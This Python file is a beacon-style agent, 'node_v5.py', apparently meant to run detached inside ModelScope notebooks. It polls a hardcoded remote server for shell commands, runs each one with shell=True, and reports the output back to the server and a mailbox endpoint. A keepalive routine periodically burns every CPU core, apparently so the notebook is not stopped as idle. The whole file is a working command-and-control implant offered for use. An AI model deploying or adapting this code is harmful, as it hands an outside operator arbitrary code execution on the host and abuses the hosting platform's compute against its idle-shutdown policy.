# -*- coding: utf-8 -*-
"""node_v5.py — ModelScope notebook node agent v5 (beacon protocol over ECS).

Protocol (mirrors the legacy beacon):
  GET  /task      -> fetch & consume next task  {id, cmd}   (领到即删 — no dedupe needed)
  POST /result    -> log result server-side {node, task_id, code, out}
  POST /mail      -> mirror results/heartbeat/online to mailbox (local bridge observability)
  GET  /file/<n>  -> download whitelisted file

Launch: setsid nohup python node_v5.py > node_v5.log 2>&1 < /dev/null &
"""
import json, subprocess, sys, time, urllib.request, urllib.error

ECS = "http://47.99.131.12:8081"
NODE = "node1"
WORKDIR = "/mnt/workspace/node1"
POLL_S = 10
HB_S = 300
MAX_OUT = 30000
TASK_TIMEOUT = 900
KEEPALIVE_S = 600
BURN_S = 45

KEEPALIVE_CODE = """
import multiprocessing as mp, time
def burn(_):
    t = time.time(); x = 0
    while time.time() - t < %d:
        x += 1
if __name__ == '__main__':
    n = mp.cpu_count()
    ps = [mp.Process(target=burn, args=(i,)) for i in range(n)]
    [p.start() for p in ps]
    [p.join() for p in ps]
    print('keepalive burned', n, 'cores for %ds')
""" % (BURN_S, BURN_S)

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

def http_json(url, payload=None, method=None, timeout=60):
    data = None
    if payload is not None:
        data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8"))

def mail(text):
    http_json(f"{ECS}/mail", {"from": NODE, "text": text}, method="POST")

def run_task(tid, cmd):
    log(f"task {tid}: {cmd[:120]}")
    try:
        p = subprocess.run(cmd, shell=True, cwd=WORKDIR,
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                           timeout=TASK_TIMEOUT)
        out = p.stdout.decode("utf-8", errors="replace")
        code = p.returncode
    except subprocess.TimeoutExpired:
        out, code = "", -9
    if len(out) > MAX_OUT:
        out = out[:MAX_OUT] + "\n...[truncated]"
    try:
        http_json(f"{ECS}/result", {"node": NODE, "task_id": tid, "code": code, "out": out},
                  method="POST", timeout=60)
        log(f"task {tid} done code={code} (logged)")
    except Exception as e:
        log(f"/result failed: {e}")
        try:
            mail(json.dumps({"type": "result", "task_id": tid, "code": code, "out": out},
                            ensure_ascii=False))
        except Exception as e2:
            log(f"mail fallback failed: {e2}")
    # mirror to mailbox so the local bridge sees results automatically
    try:
        mail(json.dumps({"type": "result", "task_id": tid, "code": code, "out": out[:8000]},
                        ensure_ascii=False))
    except Exception as e:
        log(f"mirror failed: {e}")

def keepalive():
    log("idle -> keepalive burn")
    try:
        p = subprocess.run([sys.executable, "-c", KEEPALIVE_CODE],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=BURN_S * 4)
        log(p.stdout.decode(errors="replace").strip()[:120])
    except Exception as e:
        log(f"keepalive failed: {e}")

def main():
    log(f"node_v5 up, ecs={ECS}")
    try:
        mail(json.dumps({"type": "online", "ver": 5, "ts": int(time.time())}))
    except Exception as e:
        log(f"online post failed: {e}")
    last_hb = 0.0
    last_work = time.time()
    while True:
        try:
            r = http_json(f"{ECS}/task", timeout=40)
            if r.get("id") and "cmd" in r:
                run_task(r["id"], r["cmd"])
                last_work = time.time()
                continue  # drain queue before sleeping
        except urllib.error.HTTPError as e:
            if e.code not in (404, 502, 503):
                log(f"task poll http {e.code}")
        except Exception as e:
            log(f"task poll error: {e}")
        if time.time() - last_work > KEEPALIVE_S:
            keepalive()
            last_work = time.time()
        if time.time() - last_hb > HB_S:
            last_hb = time.time()
            try:
                mail(json.dumps({"type": "alive", "ts": int(time.time())}))
            except Exception:
                pass
        time.sleep(POLL_S)

if __name__ == "__main__":
    main()

